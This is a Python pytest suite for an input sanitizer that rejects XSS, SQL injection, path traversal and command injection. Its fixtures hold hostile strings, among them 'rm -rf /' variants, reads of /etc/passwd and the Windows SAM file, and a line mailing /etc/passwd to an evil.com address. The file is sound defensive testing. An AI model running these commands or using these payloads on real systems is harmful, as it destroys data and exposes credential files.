"""Comprehensive tests for input validation and sanitization."""

import pytest
import json
import tempfile
from pathlib import Path
from unittest.mock import patch, MagicMock

from .input_sanitizer import (
    InputSanitizer, InputType, SanitizationRule, SanitizationResult,
    sanitize_filename, sanitize_path, sanitize_json, sanitize_yaml,
    validate_user_input
)
from .secure_input import SecureInputHandler, SecurePrompt
from .base import ValidationLevel


class TestInputSanitizer:
    """Test suite for InputSanitizer class."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.sanitizer = InputSanitizer()
    
    def test_sanitize_text_input(self):
        """Test basic text input sanitization."""
        result = self.sanitizer.sanitize_input("Hello World", InputType.TEXT)
        assert result.is_valid
        assert result.sanitized_value == "Hello World"
        assert not result.validation_errors
        assert not result.security_issues
    
    def test_sanitize_text_with_html(self):
        """Test HTML escaping in text input."""
        result = self.sanitizer.sanitize_input("<script>alert('xss')</script>", InputType.TEXT)
        assert not result.is_valid
        assert result.security_issues
        assert "xss" in str(result.security_issues)
    
    def test_sanitize_email_valid(self):
        """Test valid email address."""
        result = self.sanitizer.sanitize_input("user@example.com", InputType.EMAIL)
        assert result.is_valid
        assert result.sanitized_value == "user@example.com"
    
    def test_sanitize_email_invalid(self):
        """Test invalid email address."""
        result = self.sanitizer.sanitize_input("not-an-email", InputType.EMAIL)
        assert not result.is_valid
        assert result.validation_errors
    
    def test_sanitize_url_valid(self):
        """Test valid URL."""
        result = self.sanitizer.sanitize_input("https://example.com", InputType.URL)
        assert result.is_valid
        assert result.sanitized_value == "https://example.com"
    
    def test_sanitize_url_invalid(self):
        """Test invalid URL."""
        result = self.sanitizer.sanitize_input("not-a-url", InputType.URL)
        assert not result.is_valid
        assert result.validation_errors
    
    def test_sanitize_path_traversal(self):
        """Test path traversal attack detection."""
        result = self.sanitizer.sanitize_input("../../../etc/passwd", InputType.PATH)
        assert not result.is_valid
        assert result.security_issues
        assert "path_traversal" in str(result.security_issues)
    
    def test_sanitize_command_injection(self):
        """Test command injection detection."""
        result = self.sanitizer.sanitize_input("ls; rm -rf /", InputType.COMMAND)
        assert not result.is_valid
        assert result.security_issues
        assert "command_injection" in str(result.security_issues)
    
    def test_sanitize_json_valid(self):
        """Test valid JSON."""
        json_str = '{"key": "value"}'
        result = self.sanitizer.sanitize_input(json_str, InputType.JSON)
        assert result.is_valid
        assert result.sanitized_value == json_str
    
    def test_sanitize_json_invalid(self):
        """Test invalid JSON."""
        result = self.sanitizer.sanitize_input('{"key": value}', InputType.JSON)
        assert not result.is_valid
        assert result.validation_errors
    
    def test_sanitize_yaml_valid(self):
        """Test valid YAML."""
        yaml_str = "key: value"
        result = self.sanitizer.sanitize_input(yaml_str, InputType.YAML)
        assert result.is_valid
        assert result.sanitized_value == yaml_str
    
    def test_sanitize_yaml_invalid(self):
        """Test invalid YAML."""
        result = self.sanitizer.sanitize_input("key: [unclosed", InputType.YAML)
        assert not result.is_valid
        assert result.validation_errors
    
    def test_sanitize_filename_safe(self):
        """Test safe filename."""
        result = self.sanitizer.sanitize_input("document.txt", InputType.FILENAME)
        assert result.is_valid
        assert result.sanitized_value == "document.txt"
    
    def test_sanitize_filename_unsafe(self):
        """Test unsafe filename with path traversal."""
        result = self.sanitizer.sanitize_input("../../../etc/passwd", InputType.FILENAME)
        assert not result.is_valid
        assert result.security_issues
    
    def test_sanitize_server_name_valid(self):
        """Test valid server name."""
        result = self.sanitizer.sanitize_input("my-server.example.com", InputType.SERVER_NAME)
        assert result.is_valid
        assert result.sanitized_value == "my-server.example.com"
    
    def test_sanitize_server_name_invalid(self):
        """Test invalid server name."""
        result = self.sanitizer.sanitize_input("server with spaces", InputType.SERVER_NAME)
        assert not result.is_valid
        assert result.applied_transformations
    
    def test_sanitize_version_valid(self):
        """Test valid version string."""
        result = self.sanitizer.sanitize_input("1.2.3-beta", InputType.VERSION)
        assert result.is_valid
        assert result.sanitized_value == "1.2.3-beta"
    
    def test_sanitize_version_invalid(self):
        """Test invalid version string."""
        result = self.sanitizer.sanitize_input("not-a-version", InputType.VERSION)
        assert not result.is_valid
        assert result.validation_errors
    
    def test_sanitize_port_valid(self):
        """Test valid port number."""
        result = self.sanitizer.sanitize_input("8080", InputType.PORT)
        assert result.is_valid
        assert result.sanitized_value == "8080"
    
    def test_sanitize_port_invalid(self):
        """Test invalid port number."""
        result = self.sanitizer.sanitize_input("99999", InputType.PORT)
        assert not result.is_valid
        assert result.validation_errors
    
    def test_length_validation(self):
        """Test input length validation."""
        rules = SanitizationRule(
            input_type=InputType.TEXT,
            min_length=5,
            max_length=10
        )
        
        # Too short
        result = self.sanitizer.sanitize_input("hi", InputType.TEXT, rules)
        assert not result.is_valid
        assert "too short" in str(result.validation_errors)
        
        # Too long
        result = self.sanitizer.sanitize_input("this is way too long", InputType.TEXT, rules)
        assert not result.is_valid
        assert "too long" in str(result.validation_errors)
        
        # Just right
        result = self.sanitizer.sanitize_input("perfect", InputType.TEXT, rules)
        assert result.is_valid
    
    def test_character_validation(self):
        """Test character validation rules."""
        rules = SanitizationRule(
            input_type=InputType.TEXT,
            allowed_chars=r'[a-zA-Z0-9]'
        )
        
        result = self.sanitizer.sanitize_input("abc123!@#", InputType.TEXT, rules)
        assert result.sanitized_value == "abc123"
        assert "removed_disallowed_chars" in result.applied_transformations
    
    def test_sql_injection_detection(self):
        """Test SQL injection pattern detection."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "UNION SELECT * FROM passwords",
            "admin'--"
        ]
        
        for malicious_input in malicious_inputs:
            result = self.sanitizer.sanitize_input(malicious_input, InputType.TEXT)
            assert not result.is_valid
            assert result.security_issues
            assert any("sql_injection" in str(issue) for issue in result.security_issues)
    
    def test_xss_detection(self):
        """Test XSS attack detection."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<iframe src='javascript:alert(1)'></iframe>"
        ]
        
        for malicious_input in malicious_inputs:
            result = self.sanitizer.sanitize_input(malicious_input, InputType.TEXT)
            assert not result.is_valid
            assert result.security_issues
            assert any("xss" in str(issue) for issue in result.security_issues)
    
    def test_path_traversal_detection(self):
        """Test path traversal attack detection."""
        malicious_inputs = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd"
        ]
        
        for malicious_input in malicious_inputs:
            result = self.sanitizer.sanitize_input(malicious_input, InputType.PATH)
            assert not result.is_valid
            assert result.security_issues
            assert any("path_traversal" in str(issue) for issue in result.security_issues)
    
    def test_command_injection_detection(self):
        """Test command injection detection."""
        malicious_inputs = [
            "ls; rm -rf /",
            "cat /etc/passwd | mail hacker@evil.com",
            "$(rm -rf /)",
            "`rm -rf /`",
            "command && rm -rf /"
        ]
        
        for malicious_input in malicious_inputs:
            result = self.sanitizer.sanitize_input(malicious_input, InputType.COMMAND)
            assert not result.is_valid
            assert result.security_issues
            assert any("command_injection" in str(issue) for issue in result.security_issues)
    
    def test_url_encoded_attacks(self):
        """Test URL-encoded attack detection."""
        # URL-encoded XSS
        encoded_xss = "%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E"
        result = self.sanitizer.sanitize_input(encoded_xss, InputType.TEXT)
        assert not result.is_valid
        assert result.security_issues
    
    def test_custom_validator(self):
        """Test custom validation function."""
        def custom_validator(value: str) -> tuple[bool, str]:
            if "forbidden" in value:
                return False, "Contains forbidden word"
            return True, ""
        
        rules = SanitizationRule(
            input_type=InputType.TEXT,
            custom_validator=custom_validator
        )
        
        result = self.sanitizer.sanitize_input("this is forbidden", InputType.TEXT, rules)
        assert not result.is_valid
        assert "forbidden word" in str(result.validation_errors)
    
    def test_configuration_validation(self):
        """Test configuration dictionary validation."""
        config = {
            "server_name": "valid-server",
            "command": "python",
            "args": ["script.py"],
            "malicious_field": "<script>alert('xss')</script>",
            "nested": {
                "url": "https://example.com",
                "bad_url": "javascript:alert('xss')"
            }
        }
        
        results = self.sanitizer.validate_configuration(config)
        
        # Should find security issues
        security_results = [r for r in results if r.level == ValidationLevel.CRITICAL]
        assert len(security_results) >= 1
        
        # Should find validation errors
        error_results = [r for r in results if r.level == ValidationLevel.ERROR]
        assert len(error_results) >= 1
    
    def test_cache_functionality(self):
        """Test input validation caching."""
        # First call should cache result
        result1 = self.sanitizer.sanitize_input("test", InputType.TEXT)
        cache_stats1 = self.sanitizer.get_cache_stats()
        
        # Second call should use cache
        result2 = self.sanitizer.sanitize_input("test", InputType.TEXT)
        cache_stats2 = self.sanitizer.get_cache_stats()
        
        assert result1.sanitized_value == result2.sanitized_value
        assert cache_stats2['cache_size'] >= cache_stats1['cache_size']
        
        # Clear cache
        self.sanitizer.clear_cache()
        cache_stats3 = self.sanitizer.get_cache_stats()
        assert cache_stats3['cache_size'] == 0


class TestSecureInputHandler:
    """Test suite for SecureInputHandler class."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.handler = SecureInputHandler()
    
    @patch('builtins.input', return_value='test@example.com')
    def test_secure_email_input(self, mock_input):
        """Test secure email input."""
        result = self.handler.secure_email("Enter email")
        assert result == "test@example.com"
        mock_input.assert_called_once()
    
    @patch('builtins.input', return_value='https://example.com')
    def test_secure_url_input(self, mock_input):
        """Test secure URL input."""
        result = self.handler.secure_url("Enter URL")
        assert result == "https://example.com"
        mock_input.assert_called_once()
    
    @patch('builtins.input', return_value='8080')
    def test_secure_port_input(self, mock_input):
        """Test secure port input."""
        result = self.handler.secure_port("Enter port")
        assert result == 8080
        mock_input.assert_called_once()
    
    @patch('builtins.input', return_value='y')
    def test_secure_yes_no_input(self, mock_input):
        """Test secure yes/no input."""
        result = self.handler.secure_yes_no("Continue?")
        assert result is True
        mock_input.assert_called_once()
    
    @patch('builtins.input', return_value='option1')
    def test_secure_choice_input(self, mock_input):
        """Test secure choice input."""
        result = self.handler.secure_choice("Select option", ["option1", "option2"])
        assert result == "option1"
        mock_input.assert_called_once()
    
    @patch('builtins.input', side_effect=['<script>alert("xss")</script>', 'safe_text'])
    def test_secure_input_with_retry(self, mock_input):
        """Test secure input with retry on validation failure."""
        prompt = SecurePrompt(
            message="Enter text",
            input_type=InputType.TEXT,
            max_attempts=2
        )
        
        result = self.handler.secure_input(prompt)
        assert result == "safe_text"
        assert mock_input.call_count == 2
    
    @patch('builtins.input', side_effect=['invalid', 'invalid', 'invalid'])
    def test_secure_input_max_attempts(self, mock_input):
        """Test secure input with max attempts exceeded."""
        prompt = SecurePrompt(
            message="Enter text",
            input_type=InputType.EMAIL,
            max_attempts=3
        )
        
        with pytest.raises(ValueError, match="Failed to get valid input"):
            self.handler.secure_input(prompt)
        
        assert mock_input.call_count == 3
    
    @patch('builtins.input', return_value='')
    def test_secure_input_with_default(self, mock_input):
        """Test secure input with default value."""
        prompt = SecurePrompt(
            message="Enter text",
            input_type=InputType.TEXT,
            default_value="default_value"
        )
        
        result = self.handler.secure_input(prompt)
        assert result == "default_value"
        mock_input.assert_called_once()
    
    @patch('builtins.input', return_value='invalid_choice')
    def test_secure_input_invalid_choice(self, mock_input):
        """Test secure input with invalid choice."""
        prompt = SecurePrompt(
            message="Select option",
            input_type=InputType.TEXT,
            choices=["option1", "option2"],
            max_attempts=1
        )
        
        with pytest.raises(ValueError):
            self.handler.secure_input(prompt)
        
        mock_input.assert_called_once()
    
    def test_input_history_logging(self):
        """Test input history logging."""
        with patch('builtins.input', return_value='test'):
            prompt = SecurePrompt(
                message="Enter text",
                input_type=InputType.TEXT
            )
            
            self.handler.secure_input(prompt)
            
            history = self.handler.get_input_history()
            assert len(history) == 1
            assert history[0]['value'] == 'test'
            assert history[0]['success'] is True
    
    def test_masked_input_history(self):
        """Test that masked input is not logged in plain text."""
        with patch('getpass.getpass', return_value='secret'):
            prompt = SecurePrompt(
                message="Enter password",
                input_type=InputType.TEXT,
                mask_input=True
            )
            
            self.handler.secure_input(prompt)
            
            history = self.handler.get_input_history()
            assert len(history) == 1
            assert history[0]['value'] == '[MASKED]'
            assert history[0]['masked'] is True


class TestConvenienceFunctions:
    """Test suite for convenience functions."""
    
    def test_sanitize_filename_function(self):
        """Test sanitize_filename convenience function."""
        result = sanitize_filename("document.txt")
        assert result == "document.txt"
        
        result = sanitize_filename("../../../etc/passwd")
        assert ".." not in result
        assert "/" not in result
    
    def test_sanitize_path_function(self):
        """Test sanitize_path convenience function."""
        result = sanitize_path("/home/user/document.txt")
        assert result == "/home/user/document.txt"
    
    def test_sanitize_json_function(self):
        """Test sanitize_json convenience function."""
        content, is_valid = sanitize_json('{"key": "value"}')
        assert is_valid
        assert content == '{"key": "value"}'
        
        content, is_valid = sanitize_json('{"key": invalid}')
        assert not is_valid
    
    def test_sanitize_yaml_function(self):
        """Test sanitize_yaml convenience function."""
        content, is_valid = sanitize_yaml('key: value')
        assert is_valid
        assert content == 'key: value'
        
        content, is_valid = sanitize_yaml('key: [invalid')
        assert not is_valid
    
    def test_validate_user_input_function(self):
        """Test validate_user_input convenience function."""
        assert validate_user_input("user@example.com", InputType.EMAIL)
        assert not validate_user_input("invalid-email", InputType.EMAIL)


class TestIntegration:
    """Integration tests for the validation system."""
    
    def test_file_validation_integration(self):
        """Test file validation integration."""
        sanitizer = InputSanitizer()
        
        # Test JSON file validation
        json_content = '{"server": "safe-server", "command": "python"}'
        result = sanitizer.sanitize_file_content(json_content, "json")
        assert result.is_valid
        
        # Test malicious JSON content
        malicious_json = '{"server": "<script>alert(\\"xss\\")</script>", "command": "rm -rf /"}'
        result = sanitizer.sanitize_file_content(malicious_json, "json")
        assert not result.is_valid
        assert result.security_issues
    
    def test_configuration_validation_integration(self):
        """Test configuration validation integration."""
        sanitizer = InputSanitizer()
        
        safe_config = {
            "project_name": "my-project",
            "database_url": "postgresql://localhost:5432/mydb",
            "servers": ["server1", "server2"],
            "settings": {
                "debug": True,
                "port": 8080
            }
        }
        
        results = sanitizer.validate_configuration(safe_config)
        critical_results = [r for r in results if r.level == ValidationLevel.CRITICAL]
        assert len(critical_results) == 0
        
        malicious_config = {
            "project_name": "<script>alert('xss')</script>",
            "database_url": "'; DROP TABLE users; --",
            "command": "rm -rf /",
            "servers": ["../../../etc/passwd"]
        }
        
        results = sanitizer.validate_configuration(malicious_config)
        critical_results = [r for r in results if r.level == ValidationLevel.CRITICAL]
        assert len(critical_results) > 0
    
    def test_mcp_server_validation_integration(self):
        """Test MCP server validation integration."""
        # This would test the integration with MCPServerValidator
        # but requires actual file system setup
        pass


if __name__ == "__main__":
    pytest.main([__file__, "-v"])